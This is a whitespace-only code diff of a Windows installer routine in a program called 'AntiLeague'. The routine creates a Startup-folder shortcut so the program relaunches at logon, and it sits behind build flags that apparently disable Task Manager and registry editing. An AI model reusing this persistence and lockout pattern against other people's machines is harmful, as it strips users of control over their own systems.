@@ -78,7 +78,7 @@ std::string Installer::getInstallPath()
 
 void Installer::Install()
 {
-	std::string installPath = getInstallPath();
+    std::string installPath = getInstallPath();
 
 #if defined(DisableTaskMGR) || defined(DisableRegistry) || defined(RunOnceRegistry)
     HKEY hkey;
@@ -223,23 +223,23 @@ void Installer::Install()
     std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
     std::wstring installPathW = converter.from_bytes(installPath);
 
-	IShellLink* psl;
-	CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
+    IShellLink* psl;
+    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
 
-	IPersistFile* ppf;
-	psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
+    IPersistFile* ppf;
+    psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
 
-	psl->Resolve(NULL, 0);
-	psl->SetPath((LPCWSTR)installPathW.c_str());
-	psl->SetWorkingDirectory((LPCWSTR)installPathW.erase(installPathW.find_last_of(L"\\/")).c_str());
-	psl->SetArguments(NULL);
-	psl->SetDescription(L"AntiLeague");
+    psl->Resolve(NULL, 0);
+    psl->SetPath((LPCWSTR)installPathW.c_str());
+    psl->SetWorkingDirectory((LPCWSTR)installPathW.erase(installPathW.find_last_of(L"\\/")).c_str());
+    psl->SetArguments(NULL);
+    psl->SetDescription(L"AntiLeague");
 
-	std::wstring linkFile = (std::wstring)startup + L"\\AntiLeague.lnk";
-	ppf->Save((LPCWSTR)linkFile.c_str(), TRUE);
+    std::wstring linkFile = (std::wstring)startup + L"\\AntiLeague.lnk";
+    ppf->Save((LPCWSTR)linkFile.c_str(), TRUE);
 
-	ppf->Release();
-	psl->Release();
+    ppf->Release();
+    psl->Release();
 #endif
 }
 
